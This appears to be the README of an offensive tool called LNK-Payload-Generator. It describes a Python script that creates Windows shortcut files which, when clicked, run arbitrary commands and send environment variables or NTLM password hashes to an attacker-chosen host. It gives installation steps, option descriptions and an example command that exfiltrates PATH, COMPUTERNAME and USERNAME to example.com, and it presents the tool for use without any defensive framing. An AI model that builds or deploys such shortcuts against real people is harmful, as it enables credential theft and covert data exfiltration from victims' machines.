# LNK-Payload-Generator

LNK-Payload-Generator is a Python script that generates Windows shortcut files (LNK) with specific commands and configurations. These shortcuts can exfiltrate data or execute specific commands when clicked.

## Features

- Generate LNK files for both Windows and non-Windows systems
- Customize the command to execute upon clicking the shortcut
- Exfiltrate specified environment variables or NTLM password hashes
- Supports English, Russian, and Chinese languages

## Requirements

- Python 3.x
- For Windows: `pywin32` module
- For non-Windows: `pylnk` module

## Installation

1. Clone the repository:
    ```bash
    git clone https://github.com/your-username/LNK-Payload-Generator.git
    cd LNK-Payload-Generator
    ```

2. Install the required modules:
    ```bash
    pip install -r requirements.txt
    ```

## Usage

1. Run the script with the desired options:
    ```bash
    python lnk_payload_generator.py --lang <language> --host <host> --output <output.lnk> [--execute <command>] [--vars <variables>] [--type <type>]
    ```

2. Example:
    ```bash
    python lnk_payload_generator.py --lang en --host example.com --output payload.lnk --execute "notepad.exe" --vars "PATH,COMPUTERNAME,USERNAME" --type environment
    ```

## Options

- `--lang`: Choose language: en, ru, zh
- `--host`: Where should we send our data?
- `--output`: The name of the lnk file
- `--execute`: Command to execute when the shortcut is clicked (default: `C:\Windows\explorer.exe .`)
- `--vars`: Variables to exfiltrate, e.g., "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS"
- `--type`: Payload type to generate (choices: `environment`, `ntlm`, `all`)

## Documentation

Detailed documentation is available in the `docs` folder.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Contributing

Contributions are welcome! Please read the [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

